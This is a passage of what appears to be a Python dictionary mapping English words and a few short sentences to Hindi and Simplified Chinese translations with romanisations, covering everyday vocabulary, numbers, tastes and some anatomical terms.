                "Hindi": "परंपरा (parampārā)",
                "Chinese (Simplified)": "传统 (chuántǒng)"
            },
            "generation": {
                "Hindi": "पीढ़ी (pīṛhī)",
                "Chinese (Simplified)": "一代 (yīdài)"
            },
            "taboo": {
                "Hindi": "निषिद्ध (niṣiddha)",
                "Chinese (Simplified)": "禁忌 (jìjìn)"
            },
            "again": {
                "Hindi": "फिर (phir)",
                "Chinese (Simplified)": "再次 (zàicì)"
            },
            "against": {
                "Hindi": "के खिलाफ (ke khilaf)",
                "Chinese (Simplified)": "反对 (fǎnduì)"
            },
            "defend": {
                "Hindi": "रक्षा करना (rakṣā karnā)",
                "Chinese (Simplified)": "保护 (bǎohù)"
            },
            "oppose": {
                "Hindi": "विरोध करना (virodh karnā)",
                "Chinese (Simplified)": "反对 (fǎnduì)"
            },
            "criticize": {
                "Hindi": "आलोचना करना (ālocnā karnā)",
                "Chinese (Simplified)": "批评 (pīpíng)"
            },
            "migrate": {
                "Hindi": "प्रवास करना (pravās karnā)",
                "Chinese (Simplified)": "移民 (yímín)"
            },
            "migration": {
                "Hindi": "प्रवास (pravās)",
                "Chinese (Simplified)": "移民 (yímín)"
            },
            "diaspora": {
                "Hindi": "प्रवास (pravās)",
                "Chinese (Simplified)": "侨民 (qiáomín)"
            },
            "bully": {
                "Hindi": "धमकाना (dhamkānā)",
                "Chinese (Simplified)": "欺负 (qīfù)"
            },
            "raid": {
                "Hindi": "छापा मारना (chāpā mārnā)",
                "Chinese (Simplified)": "突袭 (tūxí)"
            },
            "doom": {
                "Hindi": "विनाश (vināś)",
                "Chinese (Simplified)": "厄运 (èyùn)"
            },
            "any": {
                "Hindi": "कोई भी (koī bhī)",
                "Chinese (Simplified)": "任何 (rènhe)"
            },
            "setup": {
                "Hindi": "स्थापना (sthāpanā)",
                "Chinese (Simplified)": "设置 (shèzhì)"
            },
            "tour": {
                "Hindi": "दौरा (daurā)",
                "Chinese (Simplified)": "旅游 (lǚyóu)"
            },
            "shot": {
                "Hindi": "शॉट (śoṭ)",
                "Chinese (Simplified)": "射击 (shèjī)"
            },
            "experience": {
                "Hindi": "अनुभव (anubhav)",
                "Chinese (Simplified)": "经验 (jīngyàn)"
            },
            "map": {
                "Hindi": "नक्शा (nakṣā)",
                "Chinese (Simplified)": "地图 (dìtú)"
            },
            "public": {
                "Hindi": "जनता (janatā)",
                "Chinese (Simplified)": "公共的 (gōnggòng de)"
            },
            "republic": {
                "Hindi": "गणतंत्र (gaṇatantra)",
                "Chinese (Simplified)": "共和国 (gònghéguó)"
            },
            "publish": {
                "Hindi": "प्रकाशित करना (prakāśit karnā)",
                "Chinese (Simplified)": "出版 (chūbǎn)"
            },
            "competition": {
                "Hindi": "प्रतियोगिता (pratiyogitā)",
                "Chinese (Simplified)": "比赛 (bǐsài)"
            },
            "match": {
                "Hindi": "मैच (maic)",
                "Chinese (Simplified)": "比赛 (bǐsài)"
            },
            "bows": {
                "Hindi": "धनुष (dhanuṣ)",
                "Chinese (Simplified)": "弓 (gōng)"
            },
            "bow": {
                "Hindi": "धनुष (dhanuṣ)",
                "Chinese (Simplified)": "弓 (gōng)"
            },
            "arrow": {
                "Hindi": "तीर (tīr)",
                "Chinese (Simplified)": "箭 (jiàn)"
            },
            "arrows": {
                "Hindi": "तीर (tīr)",
                "Chinese (Simplified)": "箭 (jiàn)"
            },
            "chess": {
                "Hindi": "शतरंज (śataranj)",
                "Chinese (Simplified)": "国际象棋 (guójì xiàngqí)"
            },
            "invade": {
                "Hindi": "आक्रमण करना (ākramṇa karnā)",
                "Chinese (Simplified)": "入侵 (rùqīn)"
            },
            "tribe": {
                "Hindi": "जनजाति (janajāti)",
                "Chinese (Simplified)": "部落 (bùluò)"
            },
            "grab": {
                "Hindi": "छीनना (chīnṇā)",
                "Chinese (Simplified)": "抓取 (zhuāqǔ)"
            },
            "master": {
                "Hindi": "उस्ताद (ustād)",
                "Chinese (Simplified)": "大师 (dàshī)"
            },
            "masterpiece": {
                "Hindi": "कृति (kr̥ti)",
                "Chinese (Simplified)": "杰作 (jiézùo)"
            },
            "mixed": {
                "Hindi": "मिश्रित (miśrit)",
                "Chinese (Simplified)": "混合的 (hùnhé de)"
            },
            "mix": {
                "Hindi": "मिलाना (milānā)",
                "Chinese (Simplified)": "混合 (hùnhé)"
            },
            "problem": {
                "Hindi": "समस्या (samasyā)",
                "Chinese (Simplified)": "问题 (wèntí)"
            },
            "material": {
                "Hindi": "सामग्री (sāmagrī)",
                "Chinese (Simplified)": "材料 (cáiliào)"
            },
            "particle": {
                "Hindi": "कण (kaṇa)",
                "Chinese (Simplified)": "粒子 (lìzi)"
            },
            "particles": {
                "Hindi": "कण (kaṇa)",
                "Chinese (Simplified)": "粒子 (lìzi)"
            },
            "rays": {
                "Hindi": "किरणें (kirṇaṃ)",
                "Chinese (Simplified)": "射线 (shèxiàn)"
            },
            "reason": {
                "Hindi": "कारण (kāraṇ)",
                "Chinese (Simplified)": "原因 (yuányīn)"
            },
            "valley": {
                "Hindi": "घाटी (ghāṭī)",
                "Chinese (Simplified)": "山谷 (shāngǔ)"
            },
            "miss": {
                "Hindi": "चूक जाना (cūk jānā)",
                "Chinese (Simplified)": "错过 (cuòguò)"
            },
            "harassment": {
                "Hindi": "उत्पीड़न (utpīḍan)",
                "Chinese (Simplified)": "骚扰 (sāorǎo)"
            },
            "assault": {
                "Hindi": "हमला (hamlā)",
                "Chinese (Simplified)": "袭击 (xíjí)"
            },
            "claim": {
                "Hindi": "दावा (dava)",
                "Chinese (Simplified)": "声称 (shēngchēng)"
            },
            "owner": {
                "Hindi": "मालिक (malik)",
                "Chinese (Simplified)": "所有者 (suǒyǒuzhě)"
            },
            "clown": {
                "Hindi": "जोकर (joker)",
                "Chinese (Simplified)": "小丑 (xiǎochǒu)"
            },
            "clone": {
                "Hindi": "प्रति (prati)",
                "Chinese (Simplified)": "克隆 (kèlóng)"
            },
            "creep": {
                "Hindi": "रेंगना (rengna)",
                "Chinese (Simplified)": "爬行 (páxíng)"
            },
            "batch": {
                "Hindi": "बैच (batch)",
                "Chinese (Simplified)": "批次 (pīcì)"
            },
            "shop": {
                "Hindi": "दुकान (dukan)",
                "Chinese (Simplified)": "商店 (shāngdiàn)"
            },
            "ground": {
                "Hindi": "भूमि (bhumi)",
                "Chinese (Simplified)": "地面 (dìmiàn)"
            },
            "grass": {
                "Hindi": "घास (ghas)",
                "Chinese (Simplified)": "草 (cǎo)"
            },
            "plateau": {
                "Hindi": "पठार (pathar)",
                "Chinese (Simplified)": "高原 (gāoyuán)"
            },
            "plateaus": {
                "Hindi": "पठार (pathar)",
                "Chinese (Simplified)": "高原 (gāoyuán)"
            },
            "grand": {
                "Hindi": "भव्य (bhavya)",
                "Chinese (Simplified)": "宏伟 (hóngwěi)"
            },
            "little": {
                "Hindi": "थोड़ा (thoda)",
                "Chinese (Simplified)": "小 (xiǎo)"
            },
            "lantern": {
                "Hindi": "लालटेन (lalten)",
                "Chinese (Simplified)": "灯笼 (dēnglóng)"
            },
            "hundred": {
                "Hindi": "सौ (sau)",
                "Chinese (Simplified)": "一百 (yībǎi)"
            },
            "hundreds": {
                "Hindi": "सैकड़ों (saikdon)",
                "Chinese (Simplified)": "几百 (jǐbǎi)"
            },
            "thousands": {
                "Hindi": "हजारों (hazaron)",
                "Chinese (Simplified)": "几千 (jǐqiān)"
            },
            "thousand": {
                "Hindi": "हजार (hazar)",
                "Chinese (Simplified)": "一千 (yīqiān)"
            },
            "lakhs": {
                "Hindi": "लाखों (lakhon)",
                "Chinese (Simplified)": "十万 (shíwàn)"
            },
            "lacs": {
                "Hindi": "लाख (lakh)",
                "Chinese (Simplified)": "十万 (shíwàn)"
            },
            "millions": {
                "Hindi": "लाखों (lakhon)",
                "Chinese (Simplified)": "百万 (bǎiwàn)"
            },
            "crore": {
                "Hindi": "करोड़ (karod)",
                "Chinese (Simplified)": "一千万 (yīqiānwàn)"
            },
            "billion": {
                "Hindi": "अरब (arab)",
                "Chinese (Simplified)": "十亿 (shíyì)"
            },
            "billions": {
                "Hindi": "अरबों (arabon)",
                "Chinese (Simplified)": "数十亿 (shùshíyì)"
            },
            "trillion": {
                "Hindi": "खरब (kharab)",
                "Chinese (Simplified)": "万亿 (wànyì)"
            },
            "trillions": {
                "Hindi": "खरबों (kharabon)",
                "Chinese (Simplified)": "数万亿 (shùwànyì)"
            },
            "crunch": {
                "Hindi": "चबाना (chabana)",
                "Chinese (Simplified)": "咬碎 (yǎosuì)"
            },
            "spice": {
                "Hindi": "मसाला (masala)",
                "Chinese (Simplified)": "香料 (xiāngliào)"
            },
            "sugar": {
                "Hindi": "चीनी (chini)",
                "Chinese (Simplified)": "糖 (táng)"
            },
            "salt": {
                "Hindi": "नमक (namak)",
                "Chinese (Simplified)": "盐 (yán)"
            },
            "salty": {
                "Hindi": "नमकीन (namkeen)",
                "Chinese (Simplified)": "咸 (xián)"
            },
            "fault": {
                "Hindi": "गलती (galti)",
                "Chinese (Simplified)": "错误 (cuòwù)"
            },
            "faulty": {
                "Hindi": "खराब (kharab)",
                "Chinese (Simplified)": "有缺陷 (yǒuquēxiàn)"
            },
            "naughty": {
                "Hindi": "शरारती (shararti)",
                "Chinese (Simplified)": "顽皮 (wánpí)"
            },
            "loyal": {
                "Hindi": "वफादार (vafadar)",
                "Chinese (Simplified)": "忠诚 (zhōngchéng)"
            },
            "criminal": {
                "Hindi": "अपराधी (apradhi)",
                "Chinese (Simplified)": "罪犯 (zuìfàn)"
            },
            "modification": {
                "Hindi": "संशोधन (sanshodhan)",
                "Chinese (Simplified)": "修改 (xiūgǎi)"
            },
            "modify": {
                "Hindi": "संशोधित करना (sanshodhit karna)",
                "Chinese (Simplified)": "修改 (xiūgǎi)"
            },
            "few": {
                "Hindi": "कुछ (kuchh)",
                "Chinese (Simplified)": "几个 (jǐgè)"
            },
            "large": {
                "Hindi": "बड़ा (bada)",
                "Chinese (Simplified)": "大 (dà)"
            },
            "many": {
                "Hindi": "बहुत सारे (bahut saare)",
                "Chinese (Simplified)": "许多 (xǔduō)"
            },
            "tell": {
                "Hindi": "बताना (batana)",
                "Chinese (Simplified)": "告诉 (gàosù)"
            },
            "told": {
                "Hindi": "बताया (bataya)",
                "Chinese (Simplified)": "告诉了 (gàosùle)"
            },
            "wow": {
                "Hindi": "वाह (vah)",
                "Chinese (Simplified)": "哇 (wā)"
            },
            "manage": {
                "Hindi": "प्रबंधन करना (prabandhan karna)",
                "Chinese (Simplified)": "管理 (guǎnlǐ)"
            },
            "responsibility": {
                "Hindi": "जिम्मेदारी (zimmedari)",
                "Chinese (Simplified)": "责任 (zérèn)"
            },
            "responsible": {
                "Hindi": "जिम्मेदार (zimmedar)",
                "Chinese (Simplified)": "负责 (fùzé)"
            },
            "collapse": {
                "Hindi": "गिरना (girna)",
                "Chinese (Simplified)": "倒塌 (dǎotā)"
            },
            "introduction": {
                "Hindi": "परिचय (parichay)",
                "Chinese (Simplified)": "介绍 (jièshào)"
            },
            "introduce": {
                "Hindi": "परिचय देना (parichay dena)",
                "Chinese (Simplified)": "介绍 (jièshào)"
            },
            "self": {
                "Hindi": "स्वयं (svayam)",
                "Chinese (Simplified)": "自己 (zìjǐ)"
            },
            "care": {
                "Hindi": "देखभाल (dekhbhal)",
                "Chinese (Simplified)": "照顾 (zhàogù)"
            },
            "careless": {
                "Hindi": "लापरवाह (laparvah)",
                "Chinese (Simplified)": "粗心 (cūxīn)"
            },
            "protect": {
                "Hindi": "सुरक्षित करना (surakshit karna)",
                "Chinese (Simplified)": "保护 (bǎohù)"
            },
            "reality": {
                "Hindi": "वास्तविकता (vastavikta)",
                "Chinese (Simplified)": "现实 (xiànshí)"
            },
            "train": {
                "Hindi": "प्रशिक्षण देना (prashikshan dena)",
                "Chinese (Simplified)": "训练 (xùnliàn)"
            },
            "training": {
                "Hindi": "प्रशिक्षण (prashikshan)",
                "Chinese (Simplified)": "训练 (xùnliàn)"
            },
            "look": {
                "Hindi": "देखना (dekhna)",
                "Chinese (Simplified)": "看 (kàn)"
            },
            "habit": {
                "Hindi": "आदत (aadat)",
                "Chinese (Simplified)": "习惯 (xíguàn)"
            },
            "major": {
                "Hindi": "मुख्य (mukhya)",
                "Chinese (Simplified)": "主要 (zhǔyào)"
            },
            "minor": {
                "Hindi": "छोटा (chhota)",
                "Chinese (Simplified)": "次要 (cìyào)"
            },
            "majority": {
                "Hindi": "बहुमत (bahumat)",
                "Chinese (Simplified)": "多数 (duōshù)"
            },
            "minority": {
                "Hindi": "अल्पसंख्यक (alpasankhyak)",
                "Chinese (Simplified)": "少数 (shǎoshù)"
            },  
            "genius": {
                "Hindi": "प्रतिभाशाली (Pratibhashali)",
                "Chinese (Simplified)": "天才 (tiāncái)"
            },
            "intermediate": {
                "Hindi": "मध्यवर्ती (Madhyavarti)",
                "Chinese (Simplified)": "中级 (zhōngjí)"
            },
            "joke": {
                "Hindi": "मज़ाक (Mazāk)",
                "Chinese (Simplified)": "玩笑 (wánxiào)"
            },
            "ban": {
                "Hindi": "प्रतिबंध (Pratibandh)",
                "Chinese (Simplified)": "禁止 (jìnzhǐ)"
            },
            "unban": {
                "Hindi": "प्रतिबंध हटाना (Pratibandh Hatana)",
                "Chinese (Simplified)": "取消禁止 (qǔxiāo jìnzhǐ)"
            },
            "thug": {
                "Hindi": "गुंडा (Gunda)",
                "Chinese (Simplified)": "暴徒 (bàotú)"
            },
            "steal": {
                "Hindi": "चोरी करना (Chori Karna)",
                "Chinese (Simplified)": "偷窃 (tōuqiè)"
            },
            "fight": {
                "Hindi": "लड़ाई (Ladai)",
                "Chinese (Simplified)": "战斗 (zhàndòu)"
            },
            "war": {
                "Hindi": "युद्ध (Yuddh)",
                "Chinese (Simplified)": "战争 (zhànzhēng)"
            },  
            #Tastes
            "sweet": {
                "Hindi": "मीठा (Meetha)",
                "Chinese (Simplified)": "甜 (tián)"
            },
            "sour": {
                "Hindi": "खट्टा (Khatta)",
                "Chinese (Simplified)": "酸 (suān)"
            },
            "bitter": {
                "Hindi": "कड़वा (Kadwa)",
                "Chinese (Simplified)": "苦 (kǔ)"
            },
            "spicy": {
                "Hindi": "मसालेदार (Masaledar)",
                "Chinese (Simplified)": "辣 (là)"
            },
            "umami": {
                "Hindi": "उमामी (Umami)",
                "Chinese (Simplified)": "鲜 (xiān)"
            },
            "savory": {
                "Hindi": "चटपटा (Chatpata)",
                "Chinese (Simplified)": "美味 (měiwèi)"
            },
            "bland": {
                "Hindi": "फीका (Feeka)",
                "Chinese (Simplified)": "淡 (dàn)"
            },
            "tangy": {
                "Hindi": "चटपटा (Chatpata)",
                "Chinese (Simplified)": "酸辣 (suānlà)"
            },
            "free": {
                "Hindi": "मुफ़्त (Muft)",
                "Chinese (Simplified)": "免费 (miǎnfèi)"
            },
            "paid": {
                "Hindi": "भुगतान किया हुआ (Bhugtan Kiya Hua)",
                "Chinese (Simplified)": "付费 (fùfèi)"
            },
            "leave": {
                "Hindi": "छोड़ना (Chhodna)",
                "Chinese (Simplified)": "离开 (líkāi)"
            },
            "mail": {
                "Hindi": "डाक (Daak)",
                "Chinese (Simplified)": "邮件 (yóujiàn)"
            },
            "calculate": {
                "Hindi": "गणना करना (Ganna Karna)",
                "Chinese (Simplified)": "计算 (jìsuàn)"
            },
            "worship": {
                "Hindi": "पूजा (Pooja)",
                "Chinese (Simplified)": "崇拜 (chóngbài)"
            },
            "viral": {
                "Hindi": "वायरल (Viral)",
                "Chinese (Simplified)": "病毒式 (bìngdúshì)"
            },
            "fever": {
                "Hindi": "बुखार (Bukhar)",
                "Chinese (Simplified)": "发烧 (fāshāo)"
            },
            "disgust": {
                "Hindi": "घृणा (Ghrina)",
                "Chinese (Simplified)": "厌恶 (yànwù)"
            },
            "disgusting": {
                "Hindi": "घिनौना (Ghinauna)",
                "Chinese (Simplified)": "恶心 (ěxīn)"
            },
            "disguise": {
                "Hindi": "भेष (Bhes)",
                "Chinese (Simplified)": "伪装 (wěizhuāng)"
            },
            "update": {
                "Hindi": "अद्यतन (Adyatan)",
                "Chinese (Simplified)": "更新 (gēngxīn)"
            },
            "upgrade": {
                "Hindi": "उन्नयन (Unnayan)",
                "Chinese (Simplified)": "升级 (shēngjí)"
            },
            "because": {
                "Hindi": "क्योंकि (Kyonki)",
                "Chinese (Simplified)": "因为 (yīnwèi)"
            },
            "reuse": {
                "Hindi": "पुनः उपयोग (Punah Upyog)",
                "Chinese (Simplified)": "再利用 (zài lìyòng)"
            },
            "reduce": {
                "Hindi": "कम करना (Kam Karna)",
                "Chinese (Simplified)": "减少 (jiǎnshǎo)"
            },
            "recycle": {
                "Hindi": "पुनर्चक्रण (Punarchakran)",
                "Chinese (Simplified)": "回收 (huíshōu)"
            },
            "practice": {
                "Hindi": "अभ्यास (Abhyas)",
                "Chinese (Simplified)": "练习 (liànxí)"
            },
            "priest": {
                "Hindi": "पुजारी (Pujari)",
                "Chinese (Simplified)": "牧师 (mùshī)"
            },
            "boss": {
                "Hindi": "मालिक (Malik)",
                "Chinese (Simplified)": "老板 (lǎobǎn)"
            },
            "wake": {
                "Hindi": "जागना (Jagna)",
                "Chinese (Simplified)": "醒来 (xǐnglái)"
            },
            "wakeup": {
                "Hindi": "जागना (Jagna)",
                "Chinese (Simplified)": "起床 (qǐchuáng)"
            },
            "lay": {
                "Hindi": "लेटना (Letna)",
                "Chinese (Simplified)": "躺下 (tǎngxià)"
            },
            "makeup": {
                "Hindi": "सौंदर्य प्रसाधन (Saundarya Prasadhan)",
                "Chinese (Simplified)": "化妆 (huàzhuāng)"
            },
            "method": {
                "Hindi": "विधि (Vidhi)",
                "Chinese (Simplified)": "方法 (fāngfǎ)"
            },
            "class": {
                "Hindi": "कक्षा (Kaksha)",
                "Chinese (Simplified)": "班级 (bānjí)"
            },
            "stay": {
                "Hindi": "रुकना (Rukna)",
                "Chinese (Simplified)": "停留 (tíngliú)"
            },
            "neighbor": {
                "Hindi": "पड़ोसी (Padosi)",
                "Chinese (Simplified)": "邻居 (línjū)"
            },
            "mystery": {
                "Hindi": "रहस्य (Rahasya)",
                "Chinese (Simplified)": "神秘 (shénmì)"
            },
            "predict": {
                "Hindi": "भविष्यवाणी करना (Bhavishyavani Karna)",
                "Chinese (Simplified)": "预测 (yùcè)"
            },
            "prediction": {
                "Hindi": "भविष्यवाणी (Bhavishyavani)",
                "Chinese (Simplified)": "预测 (yùcè)"
            },
            "awkward": {
                "Hindi": "अजीब (Ajeeb)",
                "Chinese (Simplified)": "尴尬 (gāngà)"
            },
            "plan": {
                "Hindi": "योजना (Yojana)",
                "Chinese (Simplified)": "计划 (jìhuà)"
            },
            "guarantee": {
                "Hindi": "गारंटी (Guarantee)",
                "Chinese (Simplified)": "保证 (bǎozhèng)"
            },
            "clock": {
                "Hindi": "घड़ी (Ghadi)",
                "Chinese (Simplified)": "时钟 (shízhōng)"
            },
            "humble": {
                "Hindi": "विनम्र (Vinamra)",
                "Chinese (Simplified)": "谦虚 (qiānxū)"
            },
            "narcissistic": {
                "Hindi": "आत्ममुग्ध (Aatmamugdh)",
                "Chinese (Simplified)": "自恋的 (zìliàn de)"
            },
            "interview": {
                "Hindi": "साक्षात्कार (Sakshatkar)",
                "Chinese (Simplified)": "面试 (miànshì)"
            },
            "view": {
                "Hindi": "दृश्य (Drishya)",
                "Chinese (Simplified)": "视图 (shìtú)"
            },
            "think": {
                "Hindi": "सोचना (Sochna)",
                "Chinese (Simplified)": "思考 (sīkǎo)"
            },
            "thinking": {
                "Hindi": "सोच (Soch)",
                "Chinese (Simplified)": "思维 (sīwéi)"
            },
            "nation": {
                "Hindi": "राष्ट्र (Rashtra)",
                "Chinese (Simplified)": "国家 (guójiā)"
            },
            "nationalism": {
                "Hindi": "राष्ट्रीयता (Rashtriyata)",
                "Chinese (Simplified)": "民族主义 (mínzú zhǔyì)"
            },
            "resource": {
                "Hindi": "संसाधन (Sansadhan)",
                "Chinese (Simplified)": "资源 (zīyuán)"
            },
            "into": {
                "Hindi": "में (Mein)",
                "Chinese (Simplified)": "进入 (jìnrù)"
            },
            "gangster": {
                "Hindi": "गैंगस्टर (Gangster)",
                "Chinese (Simplified)": "歹徒 (dǎitú)"
            },
            "vigilante": {
                "Hindi": "संरक्षक (Sanrakshak)",
                "Chinese (Simplified)": "义务警员 (yìwù jǐngyuán)"
            },
            "comfort": {
                "Hindi": "सुविधा (Suvidha)",
                "Chinese (Simplified)": "安慰 (ānwèi)"
            },
            "relax": {
                "Hindi": "आराम (Aaraam)",
                "Chinese (Simplified)": "放松 (fàngsōng)"
            },
            "card": {
                "Hindi": "कार्ड (Kaard)",
                "Chinese (Simplified)": "卡片 (kǎpiàn)"
            },
            "bounce": {
                "Hindi": "उछाल (Uchhaal)",
                "Chinese (Simplified)": "弹跳 (tántiào)"
            },
            "squeeze": {
                "Hindi": "निचोड़ना (Nichodna)",
                "Chinese (Simplified)": "挤压 (jǐyā)"
            },
            "sprint": {
                "Hindi": "दौड़ (Daud)",
                "Chinese (Simplified)": "冲刺 (chōngcì)"
            },
            "round": {
                "Hindi": "गोल (Gol)",
                "Chinese (Simplified)": "圆形 (yuánxíng)"
            },
            "crawl": {
                "Hindi": "रेंगना (Rengna)",
                "Chinese (Simplified)": "爬行 (páxíng)"
            },
            "blood": {
                "Hindi": "खून (Khoon)",
                "Chinese (Simplified)": "血液 (xuèyè)"
            },
            "liquid": {
                "Hindi": "तरल (Taral)",
                "Chinese (Simplified)": "液体 (yètǐ)"
            },
            "bumper": {
                "Hindi": "बम्पर (Bampar)",
                "Chinese (Simplified)": "保险杠 (bǎoxiǎn gàng)"
            },
            "intercourse": {
                "Hindi": "संबंध (Sambandh)",
                "Chinese (Simplified)": "交往 (jiāowǎng)"
            },
            "kidnap": {
                "Hindi": "अपहरण (Apharan)",
                "Chinese (Simplified)": "绑架 (bǎngjià)"
            },
            "kidnapper": {
                "Hindi": "अपहरणकर्ता (Apharankarta)",
                "Chinese (Simplified)": "绑匪 (bǎngfěi)"
            },
            "lava": {
                "Hindi": "लावा (Laava)",
                "Chinese (Simplified)": "熔岩 (róngyán)"
            },
            "cooperate": {
                "Hindi": "सहयोग करना (Sahyog Karna)",
                "Chinese (Simplified)": "合作 (hézuò)"
            },
            "privacy": {
                "Hindi": "गोपनीयता (Gopniyata)",
                "Chinese (Simplified)": "隐私 (yǐnsī)"
            },
            "security": {
                "Hindi": "सुरक्षा (Suraksha)",
                "Chinese (Simplified)": "安全 (ānquán)"
            },
            "international": {
                "Hindi": "अंतरराष्ट्रीय (Antarraashtreey)",
                "Chinese (Simplified)": "国际 (guójì)"
            },
            "ultimate": {
                "Hindi": "अंतिम (Antim)",
                "Chinese (Simplified)": "最终 (zuìzhōng)"
            },
            "safety": {
                "Hindi": "सुरक्षा (Suraksha)",
                "Chinese (Simplified)": "安全 (ānquán)"
            },
            "nest": {
                "Hindi": "घोंसला (Ghonsla)",
                "Chinese (Simplified)": "巢 (cháo)"
            },
            "tribute": {
                "Hindi": "श्रद्धांजलि (Shraddhanjali)",
                "Chinese (Simplified)": "贡品 (gòngpǐn)"
            },
            "touch": {
                "Hindi": "स्पर्श (Sparsh)",
                "Chinese (Simplified)": "触碰 (chùpèng)"
            },
            "electricity": {
                "Hindi": "बिजली (Bijli)",
                "Chinese (Simplified)": "电 (diàn)"
            },
            "wire": {
                "Hindi": "तार (Taar)",
                "Chinese (Simplified)": "电线 (diànxiàn)"
            },
            "penetrate": {
                "Hindi": "प्रवेश करना (Pravesh Karna)",
                "Chinese (Simplified)": "穿透 (chuāntòu)"
            },
            "scratch": {
                "Hindi": "खरोंच (Kharonch)",
                "Chinese (Simplified)": "划痕 (huáhén)"
            },
            "smooth": {
                "Hindi": "चिकना (Chikna)",
                "Chinese (Simplified)": "光滑 (guānghuá)"
            },
            "boundary": {
                "Hindi": "सीमा (Seema)",
                "Chinese (Simplified)": "边界 (biānjiè)"
            },
            "i need comfort after a long day.": {
                "Hindi": "लंबे दिन के बाद मुझे आराम की आवश्यकता है। (Lambe din ke baad mujhe aaraam ki aavashyakta hai)",
                "Chinese (Simplified)": "一天忙碌后我需要安慰。 (Yītiān mánglù hòu wǒ xūyào ānwèi)"
            },
            "it's good to relax and enjoy nature.": {
                "Hindi": "आराम करना और प्रकृति का आनंद लेना अच्छा है। (Aaraam karna aur prakriti ka aanand lena accha hai)",
                "Chinese (Simplified)": "放松并享受大自然是很好的。 (Fàngsōng bìng xiǎngshòu dà zìrán shì hěn hǎo de)"
            },
            "can you give me your card, please?": {
                "Hindi": "क्या आप मुझे अपना कार्ड दे सकते हैं? (Kya aap mujhe apna kaard de sakte hain?)",
                "Chinese (Simplified)": "你能把你的卡给我吗？ (Nǐ néng bǎ nǐ de kǎ gěi wǒ ma?)"
            },
            "the ball bounced high into the air.": {
                "Hindi": "गेंद हवा में ऊँचाई तक उछली। (Gend hawa mein oonchaai tak uchhli)",
                "Chinese (Simplified)": "球弹得很高。 (Qiú tán dé hěn gāo)"
            },
            "he squeezed the toothpaste onto the brush.": {
                "Hindi": "उसने ब्रश पर टूथपेस्ट निचोड़ा। (Usne brush par toothpaste nichoda)",
                "Chinese (Simplified)": "他把牙膏挤到了刷子上。 (Tā bǎ yágāo jǐ dào le shuāzi shàng)"
            },
            "she can sprint faster than anyone in her class.": {
                "Hindi": "वह अपनी कक्षा में किसी से भी तेज दौड़ सकती है। (Vah apni kaksha mein kisi se bhi tez daud sakti hai)",
                "Chinese (Simplified)": "她比班里任何人都跑得快。 (Tā bǐ bān lǐ rènhé rén dōu pǎo dé kuài)"
            },
            "we walked around the park this evening.": {
                "Hindi": "आज शाम हमने पार्क के चारों ओर चहलकदमी की। (Aaj shaam humne park ke chaaro aur chahalkadmi ki)",
                "Chinese (Simplified)": "今晚我们绕着公园散步。 (Jīnwǎn wǒmen ràozhe gōngyuán sànbù)"
            },
            "the baby started to crawl on the floor.": {
                "Hindi": "बच्चा फर्श पर रेंगने लगा। (Baccha farsh par rengne laga)",
                "Chinese (Simplified)": "婴儿开始在地板上爬。 (Yīng'ér kāishǐ zài dìbǎn shàng pá)"
            },
            "erotic": {
                "Hindi": "कामुक (Kaamuk)",
                "Chinese (Simplified)": "色情的 (Sèqíng de)"
            },
            "isolation": {
                "Hindi": "अलगाव (Alagav)",
                "Chinese (Simplified)": "隔离 (Gélí)"
            },
            "deforestation": {
                "Hindi": "वनों की कटाई (Vano ki kataai)",
                "Chinese (Simplified)": "森林砍伐 (Sēnlín kǎnfá)"
            },
            "sex": {
                "Hindi": "लिंग / यौन (Ling / Yaun)",
                "Chinese (Simplified)": "性 (Xìng)"
            },
            "puberty": {
                "Hindi": "किशोरावस्था (Kishoravastha)",
                "Chinese (Simplified)": "青春期 (Qīngchūnqī)"
            },
            "sperm": {
                "Hindi": "शुक्राणु (Shukraanu)",
                "Chinese (Simplified)": "精子 (Jīngzǐ)"
            },
            "ovum": {
                "Hindi": "अंडाणु (Andaanu)",
                "Chinese (Simplified)": "卵子 (Luǎnzǐ)"
            },
            "reproduce": {
                "Hindi": "पुनरुत्पादन करना (Punrutpaadan karna)",
                "Chinese (Simplified)": "繁殖 (Fánzhí)"
            },
            "produce": {
                "Hindi": "उत्पादन करना (Utpaadan karna)",
                "Chinese (Simplified)": "生产 (Shēngchǎn)"
            },
            "cell": {
                "Hindi": "कोशिका (Koshika)",
                "Chinese (Simplified)": "细胞 (Xìbāo)"
            },
            "atom": {
                "Hindi": "परमाणु (Parmaanu)",
                "Chinese (Simplified)": "原子 (Yuánzǐ)"
            },
            "inject": {
                "Hindi": "इंजेक्ट करना (Inject karna)",
                "Chinese (Simplified)": "注射 (Zhùshè)"
            },
            "eject": {
                "Hindi": "निष्कासित करना (Nishkasit karna)",
                "Chinese (Simplified)": "弹出 (Tánchū)"
            },
            "penis": {
                "Hindi": "लिंग (Ling)",
                "Chinese (Simplified)": "阴茎 (Yīnjīng)"
            },
            "vagina": {
                "Hindi": "योनि (Yoni)",
                "Chinese (Simplified)": "阴道 (Yīndào)"
            },
            "breast": {
                "Hindi": "स्तन (Stan)",
                "Chinese (Simplified)": "乳房 (Rǔfáng)"
            },
            "countdown": {
                "Hindi": "उलटी गिनती (Ulti Ginti)",
                "Chinese (Simplified)": "倒计时 (Dào jì shí)"
            },
            "ruin": {
                "Hindi": "बरबाद करना (Barbad Karna)",
                "Chinese (Simplified)": "毁灭 (Huǐmiè)"
            },
            "dungeon": {
                "Hindi": "कालकोठरी (Kaalkothri)",
                "Chinese (Simplified)": "地牢 (Dìláo)"
            },
            "entire": {
                "Hindi": "पूरा (Poora)",
                "Chinese (Simplified)": "整个 (Zhěnggè)"
            },
            "bust": {
                "Hindi": "ध्वस्त करना (Dhvast Karna)",
                "Chinese (Simplified)": "打碎 (Dǎsuì)"
            },
            "busted": {
                "Hindi": "पकड़ा गया (Pakda Gaya)",
                "Chinese (Simplified)": "被抓 (Bèi zhuā)"
            },
            "accident": {
                "Hindi": "दुर्घटना (Durghatna)",
                "Chinese (Simplified)": "事故 (Shìgù)"
            },
            "incident": {
                "Hindi": "घटना (Ghatna)",
                "Chinese (Simplified)": "事件 (Shìjiàn)"
            },
            "logic": {
                "Hindi": "तर्क (Tark)",
                "Chinese (Simplified)": "逻辑 (Luójí)"
            },
            "pillow": {
                "Hindi": "तकिया (Takiya)",
                "Chinese (Simplified)": "枕头 (Zhěntou)"
            },
            "tool": {
                "Hindi": "उपकरण (Upkaran)",
                "Chinese (Simplified)": "工具 (Gōngjù)"
            },
            "gear": {
                "Hindi": "गियर (Gear) / यंत्र (Yantra)",
                "Chinese (Simplified)": "齿轮 (Chǐlún)"
            },
            "guess": {
                "Hindi": "अनुमान लगाना (Anumaan Lagana)",
